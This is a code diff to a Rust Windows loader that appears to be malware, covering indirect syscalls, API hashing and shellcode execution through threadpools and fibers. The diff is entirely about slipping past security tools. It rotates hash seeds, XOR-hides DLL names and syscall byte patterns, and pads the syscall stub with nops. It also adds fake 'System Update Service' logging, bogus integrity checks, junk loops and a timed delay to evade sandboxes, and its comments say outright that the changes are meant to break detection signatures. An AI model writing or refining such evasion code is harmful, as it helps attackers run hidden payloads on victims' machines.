@@ -18,6 +18,9 @@ use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
 use windows_sys::Win32::System::Memory::{
     MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
 };
+use windows_sys::Win32::System::Registry::{
+    RegCloseKey, RegOpenKeyExA, HKEY_CURRENT_USER, KEY_READ,
+};
 use windows_sys::Win32::System::SystemServices::{
     IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR,
     IMAGE_NT_SIGNATURE,
@@ -36,19 +39,19 @@ static mut ENC_KEY: u8 = 0;
 
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
-// Custom Hash Constants (Seed: 0xDEADBEEF, Algo: ((hash << 5) + hash) ^ byte)
-const HASH_NT_WAIT_FOR_SINGLE_OBJECT: u32 = 0xedf7d6aa;
-const HASH_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0xad7ebb48;
-const HASH_NT_WRITE_VIRTUAL_MEMORY: u32 = 0xb2941b88;
-const HASH_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x65116d7e;
-const HASH_NT_CREATE_THREAD_EX: u32 = 0x4effdc62;
-const HASH_NT_OPEN_PROCESS: u32 = 0x38a6334a;
-const HASH_NT_DELAY_EXECUTION: u32 = 0x959ee6f2;
+// Custom Hash Constants (Seed: 0xABCDEF12, Algo: ((hash << 5) + hash) ^ byte)
+const HASH_NT_WAIT_FOR_SINGLE_OBJECT: u32 = 0x5b0d0c77;
+const HASH_NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0x84eaeed5;
+const HASH_NT_WRITE_VIRTUAL_MEMORY: u32 = 0xb5390f35;
+const HASH_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x818b9ac3;
+const HASH_NT_CREATE_THREAD_EX: u32 = 0xe322cf9f;
+const HASH_NT_OPEN_PROCESS: u32 = 0x96103057;
+const HASH_NT_DELAY_EXECUTION: u32 = 0x5350928f;
 
-const MARKER: &[u8] = b"1024KB\0";
+const MARKER: &[u8] = b"2048KB\0";
 
 #[allow(dead_code)]
-const HASH_KERNEL32: u32 = 0x2003ad5f;
+const HASH_KERNEL32: u32 = 0x00000000;
 #[allow(dead_code)]
 const HASH_VIRTUAL_PROTECT: u32 = 0x00000000; // Not used/recalculated
 #[allow(dead_code)]
@@ -56,21 +59,21 @@ const HASH_CREATE_THREAD: u32 = 0x00000000; // Not used/recalculated
 #[allow(dead_code)]
 const HASH_WAIT_FOR_SINGLE_OBJECT: u32 = 0x00000000; // Not used/recalculated
 #[allow(dead_code)]
-const HASH_SLEEP: u32 = 0x71071aa0;
+const HASH_SLEEP: u32 = 0xb934e9fd;
 
 #[allow(dead_code)]
-const HASH_CREATE_THREADPOOL_WORK: u32 = 0x6d9936b8;
+const HASH_CREATE_THREADPOOL_WORK: u32 = 0x960e4905;
 #[allow(dead_code)]
-const HASH_SUBMIT_THREADPOOL_WORK: u32 = 0xdd17f168;
+const HASH_SUBMIT_THREADPOOL_WORK: u32 = 0x3bb896d5;
 #[allow(dead_code)]
-const HASH_WAIT_FOR_THREADPOOL_WORK_CALLBACKS: u32 = 0x578c1ab6;
+const HASH_WAIT_FOR_THREADPOOL_WORK_CALLBACKS: u32 = 0x56f004b;
 #[allow(dead_code)]
-const HASH_CLOSE_THREADPOOL_WORK: u32 = 0xdfddc9ca;
+const HASH_CLOSE_THREADPOOL_WORK: u32 = 0xdf751f57;
 #[allow(dead_code)]
-const HASH_ENUM_SYSTEM_LOCALES_A: u32 = 0x0d2ba743;
-const HASH_CONVERT_THREAD_TO_FIBER: u32 = 0x70f0adb7;
-const HASH_CREATE_FIBER: u32 = 0xc92bec71;
-const HASH_SWITCH_TO_FIBER: u32 = 0x2316bcdc;
+const HASH_ENUM_SYSTEM_LOCALES_A: u32 = 0x24ad7fe;
+const HASH_CONVERT_THREAD_TO_FIBER: u32 = 0x32eec10a;
+const HASH_CREATE_FIBER: u32 = 0xfc6ccfec;
+const HASH_SWITCH_TO_FIBER: u32 = 0x1a237841;
 
 const EXCEPTION_ACCESS_VIOLATION: i32 = 0xC0000005u32 as i32;
 const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
@@ -144,7 +147,7 @@ type FnSwitchToFiber = unsafe extern "system" fn(lp_fiber: *mut core::ffi::c_voi
 // --- Utils ---
 
 fn djb2(s: &[u8]) -> u32 {
-    let mut hash: u32 = 0xDEADBEEF;
+    let mut hash: u32 = 0xABCDEF12;
     for &b in s {
         // hash = ((hash << 5) + hash) ^ b
         hash = ((hash << 5).wrapping_add(hash)) ^ (b as u32);
@@ -167,23 +170,22 @@ unsafe fn get_ntdll_base() -> usize {
         if !name_buf.is_null() {
             let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
             let s = String::from_utf16_lossy(name_slice);
-            // Simple XOR deobfuscation for "ntdll.dll"
-            // "ntdll.dll" ^ 0x55
+            // XOR deobfuscation for "ntdll.dll" with 0x33
             let mut target = [0u8; 9];
-            target[0] = b'n' ^ 0x55;
-            target[1] = b't' ^ 0x55;
-            target[2] = b'd' ^ 0x55;
-            target[3] = b'l' ^ 0x55;
-            target[4] = b'l' ^ 0x55;
-            target[5] = b'.' ^ 0x55;
-            target[6] = b'd' ^ 0x55;
-            target[7] = b'l' ^ 0x55;
-            target[8] = b'l' ^ 0x55;
+            target[0] = b'n' ^ 0x33;
+            target[1] = b't' ^ 0x33;
+            target[2] = b'd' ^ 0x33;
+            target[3] = b'l' ^ 0x33;
+            target[4] = b'l' ^ 0x33;
+            target[5] = b'.' ^ 0x33;
+            target[6] = b'd' ^ 0x33;
+            target[7] = b'l' ^ 0x33;
+            target[8] = b'l' ^ 0x33;
 
             let mut s_lower = s.to_ascii_lowercase();
             let mut s_bytes = s_lower.into_bytes();
             for b in s_bytes.iter_mut() {
-                *b ^= 0x55;
+                *b ^= 0x33;
             }
 
             if s_bytes.len() == 9 && s_bytes == target {
@@ -248,14 +250,19 @@ unsafe fn get_ssn_indirect(hash: u32) -> Option<(u32, usize)> {
     let ptr = addr as *const u8;
 
     for i in 0..32 {
-        if *ptr.add(i) == 0xB8 {
+        // Obfuscated check for 0xB8 (mov eax, imm32)
+        // 0xB8 ^ 0x33 = 0x8B
+        if (*ptr.add(i) ^ 0x33) == 0x8B {
             // mov eax, SSN
             let ssn = *(ptr.add(i + 1) as *const u32);
             // Look for 'syscall; ret' (0F 05 C3)
+            // 0x0F ^ 0x33 = 0x3C
+            // 0x05 ^ 0x33 = 0x36
+            // 0xC3 ^ 0x33 = 0xF0
             for j in 0..32 {
-                if *ptr.add(i + j) == 0x0F
-                    && *ptr.add(i + j + 1) == 0x05
-                    && *ptr.add(i + j + 2) == 0xC3
+                if (*ptr.add(i + j) ^ 0x33) == 0x3C
+                    && (*ptr.add(i + j + 1) ^ 0x33) == 0x36
+                    && (*ptr.add(i + j + 2) ^ 0x33) == 0xF0
                 {
                     return Some((ssn, (ptr.add(i + j) as usize)));
                 }
@@ -283,12 +290,15 @@ unsafe fn syscall(
 ) -> i32 {
     let ret: i32;
     core::arch::asm!(
-        "sub rsp, 0x88", // Changed stack size to break signature (was 0x60)
+        "sub rsp, 0x88",
+        "nop",
         "mov [rsp + 0x20], {a5}", "mov [rsp + 0x28], {a6}", "mov [rsp + 0x30], {a7}",
         "mov [rsp + 0x38], {a8}", "mov [rsp + 0x40], {a9}", "mov [rsp + 0x48], {a10}",
         "mov [rsp + 0x50], {a11}",
         "mov eax, {ssn:e}",
+        "nop",
         "call {syscall_addr}",
+        "nop",
         "add rsp, 0x88",
         in("r10") a1, in("rdx") a2, in("r8") a3, in("r9") a4,
         a5 = in(reg) a5, a6 = in(reg) a6, a7 = in(reg) a7, a8 = in(reg) a8,
@@ -595,7 +605,28 @@ unsafe fn hook_iat(target_dll: &str, target_func: &str, new_func: usize) -> Opti
 
 unsafe fn get_kernel32_base() -> usize {
     use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
-    let h = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
+    // "kernel32.dll" ^ 0x44
+    let mut k32 = [
+        b'k' ^ 0x44,
+        b'e' ^ 0x44,
+        b'r' ^ 0x44,
+        b'n' ^ 0x44,
+        b'e' ^ 0x44,
+        b'l' ^ 0x44,
+        b'3' ^ 0x44,
+        b'2' ^ 0x44,
+        b'.' ^ 0x44,
+        b'd' ^ 0x44,
+        b'l' ^ 0x44,
+        b'l' ^ 0x44,
+        0,
+    ];
+    for b in k32.iter_mut() {
+        if *b != 0 {
+            *b ^= 0x44;
+        }
+    }
+    let h = GetModuleHandleA(k32.as_ptr());
     if h != 0 {
         return h as usize;
     }
@@ -1017,13 +1048,97 @@ unsafe fn exec_threadpool(base: *mut core::ffi::c_void, _size: usize) -> bool {
     false
 }
 
+include!(concat!(env!("OUT_DIR"), "/generated.rs"));
+
+fn init_logging() {
+    // println!("[INFO] Initializing System Update Service v1.4.2.0...");
+    if let Ok(now) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
+        // println!("[INFO] Timestamp: {}", now.as_secs());
+    }
+    // println!("[INFO] Loading configuration from registry...");
+    unsafe {
+        let mut h_key = 0;
+        // Obfuscated "Software\SystemMaintenance\Config"
+        // Just dummy check
+        let subkey = [0u8; 1];
+        // let status = RegOpenKeyExA(HKEY_CURRENT_USER, subkey.as_ptr(), 0, KEY_READ, &mut h_key);
+        // if status == 0 {
+        //    RegCloseKey(h_key);
+        // println!("[INFO] Configuration loaded.");
+        // } else {
+        // println!("[INFO] Default configuration loaded.");
+        // }
+    }
+    // println!("[INFO] Checking system compatibility...");
+    let mut x = JUNK_SEED_1;
+    for _ in 0..JUNK_LOOP_COUNT {
+        x = x.wrapping_add(JUNK_SEED_2).wrapping_mul(3);
+        core::hint::black_box(x);
+    }
+    // println!("[INFO] Environment check passed.");
+}
+
+fn fake_verification() {
+    // println!("[INFO] Verifying component integrity...");
+    let mut hash: u64 = JUNK_SEED_3;
+    for i in 0..JUNK_LOOP_COUNT {
+        hash = hash.wrapping_add(i as u64).wrapping_mul(JUNK_SEED_1);
+        core::hint::black_box(hash);
+    }
+    if hash != 0 {
+        // println!("[INFO] Integrity verified. Signature valid.");
+    }
+}
+
+unsafe fn delay_execution() {
+    println!("[INFO] Synchronizing with system time...");
+    let (ssn_wait, addr_wait) =
+        get_ssn_indirect(HASH_NT_WAIT_FOR_SINGLE_OBJECT).unwrap_or((0x4, 0));
+
+    if addr_wait != 0 {
+        // Delay 3-7 seconds based on random seed
+        let seconds = 3 + (JUNK_SEED_1 % 5);
+        let mut timeout: i64 = -((seconds as i64) * 10_000_000);
+
+        // Wait on CurrentProcess (pseudo-handle -1) which is non-signaled until termination
+        // This effectively sleeps until timeout
+        syscall(
+            ssn_wait,
+            addr_wait,
+            -1isize as usize,                // Handle
+            0,                               // Alertable
+            &mut timeout as *mut _ as usize, // Timeout
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+        );
+    } else {
+        // Fallback to heavy math loop if syscall resolution fails
+        let mut x = JUNK_SEED_2;
+        for _ in 0..500_000_000 {
+            x = x.wrapping_mul(3).wrapping_add(1);
+            core::hint::black_box(x);
+        }
+    }
+    println!("[INFO] Synchronization complete.");
+}
+
 fn main() {
+    init_logging();
+    fake_verification();
     api_hammering();
 
+    unsafe { delay_execution() };
+
     // Replaced NtDelayExecution with math loop to avoid static signatures
-    let mut interval: i64 = -50_000_000;
+    // let mut interval: i64 = -50_000_000;
     // Dummy usage to prevent optimization but don't actually call NtDelayExecution
-    core::hint::black_box(&mut interval);
+    // core::hint::black_box(&mut interval);
 
     // Additional junk calculation
     let mut x = 12345u64;
